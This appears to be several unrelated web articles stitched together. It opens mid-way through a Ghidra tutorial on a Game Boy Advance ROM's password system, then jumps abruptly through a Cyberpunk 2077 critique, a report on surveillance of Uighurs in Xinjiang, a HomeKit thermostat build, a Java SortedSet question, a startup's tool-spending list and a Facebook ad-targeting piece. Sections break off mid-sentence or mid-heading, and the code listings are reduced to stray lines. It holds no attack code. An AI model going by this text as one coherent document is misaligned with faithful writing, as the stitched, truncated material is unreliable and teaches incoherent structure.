href="https://problemkaputt.de/gbatek.htm#gbamemorymap">memory regions and peripherals</a> for the Game Boy Advance. Luckily for us, <a href="https://github.com/SiD3W4y/GhidraGBA">SiD3W4y</a> on GitHub has already written one.</p><p>If you are a regular reader of this blog, a <a href="https://wrongbaud.github.io/posts/writing-a-ghidra-loader/">ghidra loader</a> may be a familiar subject to you. If not, the purpose of a Ghidra loader is to set up all of the necessary memory regions, identify any debug information or symbols that may be present in the file, and provide as much information as possible about the target file. The loader that was mentioned before outlines all of the basic peripherals of the GBA and is an excellent example loader to work with, let’s start by cloning it into the <code>ghidra-builder/workdir</code> directory. We’re doing this because we’re going to use the same docker container we built Ghidra with to build this loader.</p><div><p><code><table><tbody><tr><td><pre>1

dockerbot@797eb43ce05f:/files/GhidraGBA$ exit
exit
</pre></td></tr></tbody></table></code></p></div><p>In case the above steps are confusing, what we are doing is:</p><ol><li>Launching the docker container</li><li>Building the GhidraGBA extension, providing the path to our installation</li><li>Copying it to Ghidra’s extensions directory (so it will show up under the Install Extensions menu)</li><li>Exiting the docker container</li></ol><p>Launch Ghidra via <code>ghidraRun</code> and go to <code>File</code>-&gt; <code>Install Extensions</code>. Select the GhidraGBA loader and click <code>OK</code>. You will need to restart Ghidra for the change to take effect. Now when you load a GBA ROM you should see the following:</p><p><img data-src="https://wrongbaud.github.io/assets/img/ghidra-dbg/gba.png" alt="GBA" src="https://wrongbaud.github.io/assets/img/ghidra-dbg/gba.png"></p><p>After running the auto analysis, Ghidra seems to make a pretty quick sense of the ROM. There are a lot of functions defined and things are looking good. So the next step is to figure out some way to narrow down what we care about in this ROM image, in other words, we need to find our needle in the haystack. Let’s start by examining how the password system works in this game by entering a few passwords.</p><h2 id="analyzing-the-rom">Analyzing the Rom</h2><p>As mentioned before, our goal here is to try to understand the password system in use by this game. If we attempt to enter a password, the following screen is displayed:</p><p><img data-src="https://wrongbaud.github.io/assets/img/ghidra-dbg/rom-1.png" alt="ROM1" src="https://wrongbaud.github.io/assets/img/ghidra-dbg/rom-1.png"></p><p>Note that we have all of the consonants and no vowels and numbers “0-9”, and our passwords are only 5 characters long. This is a nice starting point for us as reverse engineers. We can use this information to help us narrow down functions of interest. For example- let’s look through the strings in the ROM and see if these values are represented in a string somewhere. If we open the strings window, <code>Window</code> -&gt; <code>Defined Strings</code>, and filter for the first 5 characters available to us as password characters we see the following:</p><p><img data-src="https://wrongbaud.github.io/assets/img/ghidra-dbg/strings-password-characters.png" alt="" src="https://wrongbaud.github.io/assets/img/ghidra-dbg/strings-password-characters.png"></p><p>So far so good - we only have two instances of this string in use. One is located at <code>0x804c11fc</code> and one at <code>0x84b86f0</code>. Upon examination of the first one, we see that this string gets passed to a function in the subroutine located at <code>0x8003358</code>, see below:</p><div><p><code><table><tbody><tr><td><pre>1

CD Projekt Red's treatment of the genre is worse than the buggy launch, and I'm going to explain how and why.</p><p>First, let's explore two IPs that do it right. Then, we'll compare Cyberpunk 2077 against their core messaging.</p><p>Let's begin.</p><h2 id="how-ghost-in-the-shell-tackles-cyberpunk">How Ghost in the Shell Tackles Cyberpunk</h2><h3 id="all-barriers-are-moot">All barriers are moot</h3><figure><img src="http://blog.constelisvoss.ml/content/images/2020/12/MOSHED-2020-12-4-13-22-6-2.gif" alt=""></figure><p>Wikipedia's explanation of the Cyberpunk genre:</p><blockquote><strong>Cyberpunk</strong> is a <a href="https://en.wikipedia.org/wiki/Subgenre">subgenre</a> of <a href="https://en.wikipedia.org/wiki/Science_fiction">science fiction</a> in a <a href="https://en.wikipedia.org/wiki/Dystopia">dystopian</a> <a href="https://en.wikipedia.org/wiki/Futurism">futuristic</a> setting that tends to focus on a "combination of <a href="https://en.wikipedia.org/wiki/Low-life">low-life</a> and <a href="https://en.wikipedia.org/wiki/High_tech">high tech</a>"<sup><a href="https://en.wikipedia.org/wiki/Cyberpunk#cite_note-1">[1]</a></sup> featuring advanced technological and scientific achievements, such as <a href="https://en.wikipedia.org/wiki/Artificial_intelligence">artificial intelligence</a> and <a href="https://en.wikipedia.org/wiki/Cybernetics">cybernetics</a>, juxtaposed with a degree of breakdown or radical change in the <a href="https://en.wikipedia.org/wiki/Social_order">social order</a>.</blockquote><p>But it's so much more than that. Look no further than <a href="https://en.wikipedia.org/wiki/Ghost_in_the_Shell">Ghost in the Shell</a> for a deeper examination.</p><p>Ghost in the Shell is about a lot of things, but what makes it a great overview of the genre itself is that Motoko Kusanagi—the protagonist—isn't limited by her physical body.</p><p>The body is a tool. The soul (Ghost) is what matters, and even that can be reconfigured, if one chooses.</p><figure><img src="http://blog.constelisvoss.ml/content/images/2020/12/OK6W_koKDTOqqqLDbIoPAvKwT3u7zGxQ6vZ1ij2uHr8.gif" alt=""></figure><p>Motoko moves through cyberspace, breaks her body to fight her opponents, and exists as a tour de force in a landscape of corruption.</p><p>As the IP has multiple iterations, different topics take the forefront in different mediums. However, Motoko is always the through-line; a cybernetic warrior who uses a canonically pleasure-district shell, augmented to beat the crap out of her opponents, regardless of the physical costs.</p><p>Furthermore, in the 90s movie, she meets a sentient AI who she merges with to yet again break human barriers (and touch on sentiency).</p><p>Barriers are no object, and choices are fathomless, despite being in a world of corruption. Cyberpunk technology affords this.</p><p>That is the backbone of the Cyberpunk genre, as explained by Ghost in the Shell. </p><h2 id="how-blade-runner-tackles-cyberpunk">How Blade Runner tackles Cyberpunk</h2><h3 id="what-is-sentiency-what-is-agency">What is sentiency?

Harrison Ford's Deckard is on a mission to reel-in misbehaving androids; that's the low media literacy baby-shit-brain reading.</p><p>You could also read Deckard as possibly being a synth himself. Or, you could read Deckard's attraction to Rachael—a replicant—as a question about love. Can androids truly love?</p><p>You could also read it as a commentary on sentiency via Pris and Roy's (both replicants) existential crises.</p><p>In the new film, <a href="https://en.wikipedia.org/wiki/Blade_Runner_2049">Blade Runner 2049</a>, you could read Gosling's K—another replicant—as experiencing true personhood through the juxtaposition of who he isn't.</p><p>By questioning his place in the narrative when he realizes his memories are fake, he explodes with emotion, and dies with the knowledge that he's challenged what he even is. That's sentiency, baby.</p><p>There are many concepts in the Blade Runner movies, and the <a href="https://en.wikipedia.org/wiki/Do_Androids_Dream_of_Electric_Sheep%3F">novel </a>they're based on, but all of them grapple with these topics:</p><p>Who gets to be a person, who gets to be free, who gets to feel, who gets to live, and who doesn't.</p><p>The backbone of the Blade Runner IP exists to question these aspects of sentiency and agency.</p><p>So what does Cyberpunk 2077 do with GiTS' and Blade Runner's hot-takes?</p><h2 id="cyberpunk-2077-fumbles-barriers-are-moot">Cyberpunk 2077 fumbles "barriers are moot"</h2><h3 id="the-body-is-not-sacred-game-director-adam-badowski">The body is not sacred, game director Adam Badowski</h3><figure><img src="http://blog.constelisvoss.ml/content/images/2020/12/MOSHED-2020-12-4-14-50-53-2.gif" alt=""></figure><blockquote>"This is cyberpunk, so people augment their body. So the body is no longer sacrum [sacred]; it's profanum [profane]. Because people modify everything, they are losing their connection to the body, to the meat. And that's why we need to use the nudity in many situations."</blockquote><p>The Cyberpunk genre is about the philosophy of personhood and human existence as juxtaposed to and twisted against technology, set upon a backdrop of corporate dystopia.</p><p>Not only are Badowski's statements ignorant of the genre, but the way Cyberpunk 2077 handles these topics is, too.</p><p>You cannot augment your character within an inch of their life. You cannot even cut their hair after the initial character generation screen. </p><p>You cannot become a 9 foot chrome-lacquered war-machine with a car engine for a crotch. You can't swap your consciousness into something else.</p><p>Because we know other characters <em><strong>can,</strong></em> Cyberpunk 2077 offers the illusion of choice by showing it exists, but barely gives it to the player.</p><p>Speaking of barely; though you can swap voice/junk gender, this doesn't break down gender barriers meaningfully.</p><p>You cannot blur the lines of sexuality, because your romance options are very limited. Have a male voice but a female body? Many routes are off the table. However, the problem isn't so much that characters [to reflect IRL people] have certain 'equipment' preferences. That's valid.</p><p>The problem is that players <em><strong>should</strong></em> be able to have a car engine for a crotch and see how that shakes things up, for example. If it does at all. </p><p>This is the one genre that <em>most</em> benefits from a predominantly bisexual romance roster, or at the very least, it benefits from having the balls to tackle the transhumanism topic.</p><p>When corporations plaster ads inside of your eyeballs, the only thing left is the ability to transform yourself beyond limits. One of those limits is the self. </p><p>The other is grappling with what the self means when you replace it with cyberware, and what flavor of human <em>other </em>people see you as.</p><p>Cyberpunk 2077 does make a stance on this, and it's not as expected; too much self-reconfiguration makes you a Cyberpsycho. NPCs lose their mind if they replace too many parts.</p><p>This shows us that the "flesh as sacrum" aspect is unavoidable. </p><p>Because of all this, Cyberpunk 2077 smacks into the "barriers are moot" genre-point like V's car barrels down roads with the finesse of a bull in a china shop.</p><p>It's nothing but barriers, with the veneer of choice.</p><h2 id="cyberpunk-2077-mishandles-the-sentiency-agency-question">Cyberpunk 2077 mishandles "the sentiency/agency question"</h2><h3 id="despite-the-attention-paid-to-johnny-invading-your-shell">Despite the attention paid to Johnny invading your shell</h3><figure><img src="http://blog.constelisvoss.ml/content/images/2020/12/cyberpunk2077-1.jpg" alt=""></figure><p>Does Cyberpunk 2077 address "the sentiency/agency question"? Keanu's Johnny Silverhands invades your shell, which suggests it does, but there's a problem.</p><p>In order to analyze this, we have to talk about the results. There are 5 endings, and all of them are a flavor of "you die because your body is beyond saving", "Johnny takes over" or "go to cyberjail while Arasaka figures out how to ya yeet you." </p><p>Only two routes shake things up, and one is "commit suicide" while the other is "fuck off somewhere to solve the problem, off-screen."</p><p>The issue? There are in-game lore "outs" to suggest personhood doesn't stop at meat suits. Lizzy Wizzy's download into a synth body comes to mind; is she not a person? The game thinks so, yet Johnny robs you of agency histrionically. </p><p>What of Alt, Johnny's past love-interest and now-sentient-AI? A missed opportunity to smash barriers, and also tackle the sentiency question. Alt has lost her "soul".</p><p>There are repercussions to digitization, even if Judy's route later explains she figured out how to dabble in recorded/shared emotions, via BD devices. Even if Arasaka <em>already</em> upgraded the engram system.</p><p>It's almost as though the cast's skills/game lore never applies breakthrough tech to your problem, until it's too late.</p><p>Can players invade the darkweb and chill with the rogue AIs? Yes, but we <em>can't</em> do it to save our own Ghost, because "the flesh is sacrum".</p><p>What of Delamain's rogue AI "children"? Surprisingly, you get to tackle the sentiency angle if you complete the Epistrophy side quests. You can honor the rogue AIs' wishes and merge them with Delamain's main personality.</p><p>Cyberpunk 2077 pretends all this technology is in its infancy to stop the player from questioning narrative choices. What it actually does is show what's possible, but <strong>not for you</strong>.</p><p>Why can't players live in the internet? Why can't they hop into a car? Why can't they download into a synth? Why can't they merge personalities with Johnny in a truly blended version, like Motoko in the GiTS 90s film?</p><p>Cyberpunk 2077 punishes players for the very concepts the Cyberpunk genre grapples with, and the game lore suggests it <em>can</em> tackle.</p><p>Who gets to be a person even if they're inside a fucking toaster? Cars, Lizzy Wizzy, and Johnny. Not the player.</p><h2 id="and-what-of-the-punk-aspect-of-cyberpunk">And what of the Punk aspect of Cyberpunk?</h2><h3 id="well-it-s-lip-service-is-the-thing">Well, it's lip-service, is the thing</h3><figure><img src="http://blog.constelisvoss.ml/content/images/2020/12/cyberpunk2077_hand_cmyk_wide-959129cd7f84b90547ac1c88d90ec6bae3b98186.jpg" alt=""></figure><p>As stated: in the genre you have body augmentation, boundary scuttling, and transhumanism as rebellion options. Another is fighting the corporatization of the self and others. That's where the Punk aspect comes in.</p><p>Though Johnny invading your shell is a nice thematic touch, he's mostly concerned with Big Corp Arasaka. He judges your character harshly if they care about plenty of <em>other</em> rebellions. </p><p>For instance, sentient AI cars get more sympathy from Johnny than the dolls of The Clouds (who are human sex workers). That's not very Punk, Johnny.</p><p>Somehow, Takemura's plot is more on-point here, as an examination of Arasaka as child-soldier creators, and yet I don't see him staging some mass "free the kids" rebellion.</p><p>To make matters worse, you can't defy the cops; killing criminals helps the police, as a feature not a bug. In order to get the gear/money you need to progress, this is basically unavoidable. If you do try to avoid it, this cuts a shitload of content out.</p><p>River Ward's side quest examines this, as the one good cop in Night City. However, his quest doesn't let you stage a rebellion against the corrupt police force. His plot-line is ripe for this aspect of Punk.</p><p>Even the 3 initial 'camps' you choose don't tango with the Punk aspect. After the first 20 minutes, all you get are dialog options.

<p><span>M</span>uharram Muhammad’ali hasn’t spoken with his family since his sister’s mobile went dead last year, but sometimes he calls his parents’ landline in Turpan, a city in the east of the Xinjiang Uighur Autonomous Region of China. Since the coronavirus pandemic spread to Xinjiang this summer, houses in the area have been sealed up, further isolating residents who were already all but cut off from the outside world. The line is always busy, but, he reasons, the fact that it is still in service means his mother is alive and paying the bill.</p>



<p>He doesn’t have any more information than that. He knows that his father, an imam, was arrested over three years ago and charged with “picking quarrels and provoking trouble” — a catchall offense that the Chinese government applies to those it considers undesirable — and later convicted in a closed trial. He assumes his father is in jail, if he hasn’t died. That news came from his uncle, but one of the last things Muhammad’ali heard from his sister was that he, too, had been taken into police custody just over a year ago. “He is lost, and now there is no one to give me information,” he says.</p>



<p>Muhammad’ali, a soft-spoken 27-year-old who reaches for Japanese words in the rare moments when his English lets him down, left China for Tokyo two years ago. To return would mean instant incarceration, so Muhammad’ali is building a life in a new city, learning to cook Uighur food with ingredients he sources from gray-market halal butchers and marveling at the obscene prices of watermelons in Japan — fruit for which Turpan is famous.&nbsp;</p>



<p>The last time he was in Turpan, he saw CCTV cameras being installed on the intersection outside his family home, another node in the network of facial recognition devices that sweep the city, perpetually recording the movements of the inhabitants. Thousands of Communist Party <a href="https://www.hrw.org/news/2018/05/13/china-visiting-officials-occupy-homes-muslim-region">cadres and security officials keep constant watch</a>, recording even the most mundane details of inhabitants’ lives — who they talk to, whether they use the front or the back door to leave the house, whether they have recently taken up exercise or given up smoking. Over the past three years, Uighurs have had their DNA collected, their voices recorded, and their walking gaits filmed and put on file. It all feeds into perhaps the most comprehensive dataset covering any population on earth, collected and manipulated by private technology companies working on behalf of the Chinese government.&nbsp;</p>



<p>Together, the state and these companies have built a one-way mirror around Xinjiang, giving the government an unprecedented ability to monitor and control the population, while preventing information from leaking out. Artificial intelligence scours social media and messaging apps in search of sensitive conversations. Simply speaking with a relative overseas is likely to draw the eye of the police and could lead to incarceration in one of the euphemistically named “vocational education and training centers” — internment facilities that, according to estimates by the <a href="https://www.reuters.com/article/us-china-rights-un/u-n-says-it-has-credible-reports-that-china-holds-million-uighurs-in-secret-camps-idUSKBN1KV1SU">U.N. Committee on the Elimination of Racial Discrimination</a>, held upwards of a million people by 2018.</p>

<p>Cut off from their loved ones, Uighurs in exile are testing the limitations of the firewall. In Japan, Muhammad’ali stays in touch with old school friends via WeChat and Douyin, the Chinese version of TikTok. They communicate in Mandarin — to use Uighur would attract attention — and in code. They are all basketball fans, so they use ciphers based on teams and players to relay information about who is still free and who has been sent to a camp <a href="https://www.aspi.org.au/report/uyghurs-sale">or transferred to a factory</a>. This doesn’t guarantee safety, but they gamble that they can stay ahead of the censors. “We can guess some keywords are monitored by machines, not by people,” Muhammad’ali says. “So we try not to say these keywords and just find other signals.”</p>



<p>Muhammad’ali and his fellow exiles meet in WeChat and WhatsApp groups, where they share and pore over leaked videos, social posts, reports from state media, and propaganda broadcasts, scanning the backgrounds for inconsistencies and absences — anything they can use to determine what is really happening back home. For the most part, they are not activists — or at least they didn’t start out as such. But frustrated with stonewalling and state propaganda, they are doing whatever they can to find out what happened to their loved ones and to relay that information to journalists and human rights organizations.&nbsp;</p>



<p>What they see is often horrifying. Although it is frequently portrayed as an all-knowing, all-seeing panopticon, the techno-state in Xinjiang is either deeply flawed or deliberately genocidal. Rather than functioning as a highly sophisticated system of predictive policing, the technology that has been deployed in Xinjiang is, in practice, a blunt instrument. It has internalized the government’s long-standing suspicion of its ethnic and religious minorities, interpreting normal behaviors as suspicious. It has automated and accelerated repression and funneled people into internment camps and crowded prisons — mass incarceration by database.</p>



<p>“The ubiquitous security, the high-tech police state is the reality, not just for the people in camps,” says Rushan Abbas, executive director of the Washington D.C.–based advocacy group Campaign for Uighurs. “Spy apps monitoring who they talk to on WeChat. QR codes in their homes scanning who’s going in and going out. Facial recognition everywhere. They are being monitored 24/7 from checkpoints to security cameras to listening devices. [The government] is using this advanced technology to collect people for the concentration camps. But even people living regular lives, like you and me, are subject to it every day. The whole Uighur identity is being criminalized.”</p>

<p><strong>For Uighurs living</strong> abroad, the first sign of an impending blackout back home emerged in late 2016. That was when the Chinese government stepped up a broad-spectrum crackdown on the Uighur population, justifying it as an anti-terror operation focused on what the government labeled Islamic extremists and separatists.</p>



<p>When the new campaign began, Mirehmet Ablet, a native of Kashgar, a city close to Xinjiang’s borders with Tajikistan and Kyrgyzstan, was living in the Netherlands; his younger brother was studying in Canada. Only their older brother, Miradil, had stayed behind in Kashgar, where he visited their parents almost every day. Even as the crackdowns escalated, and more people were sent to reeducation camps, the family felt relatively safe.</p>



<p>Both of Ablet’s parents were Communist Party members. His mother was a director of a hospital and his father a director of a school. Neither were religious or politically active. They did not keep religious books in the house, one of what Chinese authorities consider the “75 signs of religious extremism” — along with giving up smoking and owning boxing gloves. Both sons living abroad were careful to keep a low profile.</p>



<p>“We could never have expected what would happen to our family,” he says.&nbsp;</p>



<p>China’s Uighurs are used to waves of repression. The region, on the country’s western fringes, has long been seen as inconvenient but strategically important. Once a pivot on the ancient Silk Road trading route connecting China to the Middle East, it was occupied by the People’s Republic of China in 1949. It has emerged as an important node in Beijing’s Belt and Road infrastructure initiative, which has sent railway lines and highways snaking west from China’s industrial south and east into Central Asia and beyond.</p>



<p>Today, many Uighurs still call the area “East Turkestan,” a reference to its Turkic culture and language, which, along with the importance of the Islamic faith, set it apart from the country’s Han Chinese core. For the Communist Party, that otherness represents a potential threat to the stability and sovereignty of the country. As in Tibet, the government encouraged Han Chinese from the east to migrate to Xinjiang and change the dominant culture. That migration continues today, and <a href="https://theasiadialogue.com/2016/03/07/spatial-results-of-the-2010-census-in-xinjiang/">the population of around 19 million people</a> is now about 46% Uighur.&nbsp;</p>



<p>Each Chinese political generation has also brought its own form of repression to Xinjiang. In the past, downward spirals of repression and resistance had tended to burn out in a few years. This time felt different.</p>



<p>In 2009, mass riots had <a href="https://www.nytimes.com/2009/07/06/world/asia/06china.html">broken out in the regional capital of Ürümqi</a> — the result of a particularly brutal crackdown aimed at suppressing dissent stemmed from the 2008 Olympics. Although officially 197 Uighur and Han Chinese were killed, human rights groups believe the real death toll was far higher. The man sent to manage the fallout was Xi Jinping, the then-vice president who had already been tapped for leadership.</p>



<p>In 2016, two years after Xi’s government launched the so-called Strike Hard campaign, the first scattered reports of detention camps began to leak out of Xinjiang. On the ground, police started to seek signs of “foreign influence” — visiting the families of Uighurs living abroad, pressuring them for information, and encouraging them to summon their relatives back to China.</p>



<figure><blockquote><p>Uighurs have had their DNA collected, their voices recorded, and their walking gaits filmed and put on file. It all feeds into perhaps the most comprehensive dataset covering any population on earth.</p></blockquote></figure>



<p>By 2017, Ablet had acquired Dutch citizenship and was out of reach of the state, but his younger brother in Canada started getting messages asking him to come home. His friends warned him not to — returnees were disappearing — so instead, he sent letters from his university and workplace in Canada to show that he was behaving himself.

            <h2 id="post_title">Building my own HomeKit Thermostat</h2>
        

        <p>Iâ€™m pretty obsessed with controlling most of the electronics in my house from my
phone. One of the last remaining devices was the thermostat. I donâ€™t want a Nest
because it doesnâ€™t work with HomeKit, and I canâ€™t use an EcoBee because I donâ€™t
have a neutral wire. So I resolved to build my own.</p>

<p>If you are building your own thermostat, or any hardware really, and want some
help or just want to show it off, feel free to shoot me an email at mdl0394@gmail.com. 
Also I plan to continue to expand this project to have a screen and some buttons,
if you want to hear about that signup to my email list and Iâ€™ll let you know when
I do it.</p>



<h2 id="figuring-out-hot-to-turn-on-the-heat">Figuring out hot to turn on the heat</h2>

<p>So I turns out my heater runs on a really simple control protocol. There are just
two wires run from the heater to the current thermostat, when you connect them it
turns on, and when you disconnect it turns off. The only unfortunate part of it is
that the wires are 24vac, so to be safe I need to use a solid state relay for
switching.</p>

<h2 id="the-prototype">The prototype</h2>

<p>I am building this whole thing on an esp32, with a big overkill relay I got on
amazon prime. I will link the exact parts below. The current thermometer is an
old tmp102 sparkfun board I had lying around, but itâ€™s off by around 6 degrees,
so in v2 I will be replacing it with hopefully a more accurate one.</p>

<p>After wiring it all together, and taping it to my wall for a day or two, I was
satisfied with the components, and wanted to get started on prettying it up a bit.</p>



<h2 id="the-code">The code</h2>

<p>The thermostat control runs on a pretty simple state machine. I am a big fan of
drawing things out ahead of time, so I drew this diagram for myself before coding.
In C this is implemented as two enums (actions, states) and a bunch of switch case
statements.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/6d7680c909d72c389d076e0390408d1e44382733/c2055/images/homekit_thermostat/state_machine.png" alt="State machine for thermostat control"></p>

<p>It was very important to me that the thermostat worked on homekit, thankfully
there are already great homekit (hap) resources for the esp32. After some digging
I decided on this homekit package, as itâ€™s a clean port of the expressif homekit
library to arduino. There are about 15 different homekit frameworks for arduino,
so at some point I just had to choose one and start running.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/09e7eb514a6c9878988e3897b1f9377a39d331c7/9fc55/images/homekit_thermostat/homekit.jpeg" alt="Homekit screenshot showing thermostat"></p>

<p>After a whole bunch of fucking around I managed to get my esp32 to show up as a thermostat from my phone.</p>

<p>A few gotchaâ€™s that I encountered along the way: (some specific to this library, some specific to homekit)</p>

<ul>
  <li>With this HomeKit library if you want to factory reset, you have to do it <em>after</em> you initialize. Also be sure to remove the device from homekit on your phone before factory resetting the device</li>
  <li>Be sure that you have unique id and pairing codes for your device, I have another esp32 on my homekit and they kept colliding</li>
  <li>Be sure that your device cid matches with the services you are providing, otherwise you will get annoying silent failures from homekit</li>
</ul>



<h2 id="making-things-pretty">Making things pretty</h2>

<p>After getting the code into a place I liked, all that was left was to make it
look less like a bomb strapped to my living room wall. I 3d printed an enclosure,
and soldered the correct wires in the correct places. Unfortunately my board
requires constant a 5V micro-usb power source, so as of right now I have it
powered off of a huge battery pack. Maybe in vN (for very large values of N)
I will go nest style with an internal LiPo and an AC-DC converter.</p>

<h2 id="whats-next">Whatâ€™s Next?</h2>

<p>I have already bought a few parts for a planned v2, so stay tuned. In v2 I will be adding:</p>

<ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
  <p>Consider the below code which creates a <code>SortedSet</code> using a comparator based on string length</p> 
  <div> 
   <div> 
    <pre><code data-lang="java">public class SortedSetTest {
    public static void main(String[] args) {
        SortedSet&lt;String&gt; sortedSet = new TreeSet&lt;&gt;(Comparator.comparing(String::length));
        sortedSet.addAll(Set.of("aa", "bb"));
        System.out.println(sortedSet);
    }
}</code></pre> 
   </div> 
  </div> 
  <p>The output of the above is</p> 
   
  <p>While I would expect</p> 
   
  <p>or</p> 
   
  <p>The <code>bb</code> element disappears, breaking the <code>Set</code> contract. The comparator is supposed to only sort the elements and not distinguish them from one another, which is what equals does in all the collections.</p> 
  <p>On the other hand, if I enhance the comparator to always return non-zero for unequal items like below, only then do I get the correct results.</p> 
  <div> 
   <div> 
    <pre><code data-lang="java">public class SortedSetTest {
    public static void main(String[] args) {
        SortedSet&lt;String&gt; sortedSet = new TreeSet&lt;&gt;(Comparator.comparing(String::length)
            .thenComparing(String::toString));
        sortedSet.addAll(Set.of("aa", "bb"));
        System.out.println(sortedSet);
    }
}</code></pre> 
   </div> 
  </div> 
  <p>The output now is <code>[aa, bb]</code> as I would expect.</p> 
  <p>The question is, why does <code>SortedSet</code> ignore the <code>equals</code> method in first place and removes an unequal object from the set?</p> 
  <p>The <code>comparator</code> method inside the <code>SortedSet</code> interface is <a href="https://docs.oracle.com/javase/10/docs/api/java/util/SortedSet.html">documented</a> as follows:</p> 
  <div> 
   <blockquote>
     Returns the comparator used to order the elements in this set, or null if this set uses the natural ordering of its elements. 
   </blockquote> 
  </div> 
  <p>The above indicates that the comparator is only used to order the elements in the set and not to distinguish them from one another, which is what <code>equals</code> is for in all the collections.</p> 
  <p>Digging into the <a href="https://docs.oracle.com/javase/10/docs/api/java/util/SortedSet.html">javadoc</a> further, it turns out that the above javadoc comment is incorrect, because there is another side note that contradicts it:</p> 
  <div> 
   <blockquote>
     Note that the ordering maintained by a sorted set (whether or not an explicit comparator is provided) must be consistent with equals if the sorted set is to correctly implement the Set interface. (See the Comparable interface or Comparator interface for a precise definition of consistent with equals.) This is so because the Set interface is defined in terms of the equals operation, but 
    <strong>a sorted set performs all element comparisons using its compareTo (or compare) method, so two elements that are deemed equal by this method are, from the standpoint of the sorted set, equal</strong>. The behavior of a sorted set is well-defined even if its ordering is inconsistent with equals; it just 
    <strong>fails to obey the general contract of the Set</strong> interface. 
   </blockquote> 
  </div> 
  <p>Note that, <a href="https://docs.oracle.com/javase/10/docs/api/java/util/Comparator.html">by definition</a>, consistent with equals means:</p> 
  <div> 
   <blockquote>
     The ordering imposed by a comparator c on a set of elements S is said to be consistent with equals if and only if c.compare(e1, e2)==0 has the same boolean value as e1.equals(e2) for every e1 and e2 in S. 
   </blockquote> 
  </div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>We try to run a lean operation at <a href="https://mailbrew.com/">Mailbrew</a>, but we are suckers for great tools that improve our daily workflows, so we pay for quite a few of them each month.</p>
<p>Being small (just 3 people), the cost of switching services is almost negligible, so we try new stuff regularly and do switch when we see a clear improvement.</p>
<p>Here is a list of everything we <em>happily</em> pay for.</p>
<h3><a href="https://missiveapp.com/">Missive</a></h3>
<p><strong>$15/month ⨉ 3 = $45/month.</strong></p>
<p>Collaborative email on top of G Suite. The main thing we pay for is a comment box below each email thread. It allows us to quickly discuss emails without forwarding or copy/pasting in Slack. It also allows us to edit drafts collaboratively and have multiple team inboxes for invoices, support, and other stuff.</p>
<p>We pay for the Productive plan because of one feature: Rules. They allow us to automatically categorize emails and be more granular with notifications. </p>
<h3><a href="https://www.notion.so/product">Notion</a></h3>
<p><strong>$8/month ⨉ 3 = $24/month.</strong></p>
<p>It's our team wiki. We write memos, meeting notes, drafts for blog posts, and everything that needs to be shared async for feedback. We also used to put tasks here but recently moved to Linear (more on this below).</p>
<p>It's an amazing value, but we were close to ditching it because of how slow it has become. We still have to find something that delivers the same great feature set and flexibility while improving speed and reliability.</p>
<h3><a href="https://linear.app/">Linear</a></h3>
<p><strong>$8/month ⨉ 3 = $24/month.</strong></p>
<p>We put our tasks here. It's a newcomer, but it's so good that we have already committed to it for a year. </p>
<p>It completely revolutionized the way we work with its flexibility, speed, customizability, and great GitHub integration.</p>
<p>If you connect it to GitHub and open a pull request with a task-specific name, task and PR get linked. When the PR is merged, the task is automatically marked as done.</p>
<p>I would invest in this company if I had the chance. It's so much better than everything else I ever tried in this space.</p>
<h3><a href="https://vercel.com/">Vercel</a></h3>
<p><strong>$20/month ⨉ 3 = $60/month.</strong></p>
<p>Vercel deploys and hosts our frontends and serverless functions.</p>
<p>It's a bit pricier than we'd like, and the pricing does not really make sense. Why do we have to pay per team member instead of build minutes, bandwidth, and compute?</p>
<p>With all that being said, we love the product philosophy, simplicity, and integration with GitHub. Having automatic deploys for all commits, together with automatic task-linking to Linear for PRs, is code-review Nirvana.</p>
<h3><a href="https://savvycal.com/">SavvyCal</a></h3>
<p><strong>$12/month ⨉ 2 = $24/month.</strong></p>
<p>We use it to schedule our calls. It's a better Calendly, made by a solo indie developer that we're happy to support.</p>
<p>The product is super-intuitive, and its feature set is increasing at a great pace with features that massively improve our workflows.</p>
<h3><a href="https://plausible.io/">Plausible Analytics</a></h3>
<p><strong>$12/month.</strong></p>
<p>It's a privacy-focused website analytics tool that replaces Google Analytics.</p>
<p>The most impressive thing is how better the insights we get from it are, thanks to some great UX, despite its privacy-respecting stance.</p>
<p>No surprise, they have been <a href="https://www.indiehackers.com/product/plausible-insights">growing like crazy</a>.</p>
<h3><a href="https://mailbrew.com/">Mailbrew</a></h3>
<p><strong>$10/month.</strong></p>
<p>We pay for this, even if we are the ones making it, to test our Stripe Integration.</p>
<p>We use Mailbrew to receive a couple of digests with dedicated Twitter Searches that keep us updated on social mentions of our product.</p>
<h3><a href="https://super.so/">Super</a></h3>
<p><strong>$12/month.</strong></p>
<p>This turns Notion documents into their own websites with a dedicated domain. We use it for our <a href="https://mailbrew.com/press">press kit</a> and <a href="https://help.mailbrew.com/">support docs</a>.  </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><a href="https://theintercept.com/2020/12/24/facebook-ad-targeting-small-business/">This article</a> from <em>The Intercept</em> has been doing the rounds recently. It follows a case lodged by <em>Investor Village</em>, a small financial news message board, against Facebook. The case alleges that Facebook is knowingly mis-selling advertisers on its ad targeting capabilities.</p><p>The original complaint, which you can find <a href="http://www.wohlfruchter.com/sites/default/files/doc/2020-11-18-dkt-148-amended-complaint.pdf">here</a>, cites internal Facebook emails in which employees describe Facebook's ad targeting as "crap" and "abysmal".</p><p>The most damning line, taken from an internal Facebook email, is:</p><p>“interest precision in the US is only 41%—that means more than half the time we’re showing ads to someone other than the advertisers’ intended audience. And it is even worse internationally. We don’t feel we’re meeting advertisers’ interest accuracy expectations".</p><p>The compliant goes on to compare this to the sorts of benchmarks which Facebook presents to advertisers; where they claim the Facebook Ads platform allows you to target audiences with 89% accuracy. The true accuracy figure, according to the complaint, was as low as 9%.</p><figure id="w-node-89fa5168d7a1-192f161b"><p><img src="https://uploads-ssl.webflow.com/5e26e90f16b6d177e3ff36c6/5fe8b38398626fc6979340da_Untitled.png" alt=""></p></figure><p>These sorts of horror stories are likely not a surprise to many who actually advertise on Facebook's platform. I suspect that most advertisers treat Facebook's targeting claims with a pinch of salt, and certainly don't expect that 100% of people within an audience will actually belong to said audience.</p><p>If this is the case though, does it really matter if Facebook isn't 100% accurate with it's targeting? Is 41% really that bad, or is it even good? The answer, I believe, is a little more complex than it first seems.</p><h2>Does accuracy really matter?</h2><p>I don't think it really makes sense to give a single answer to this question. The reasons why advertisers use a platform like 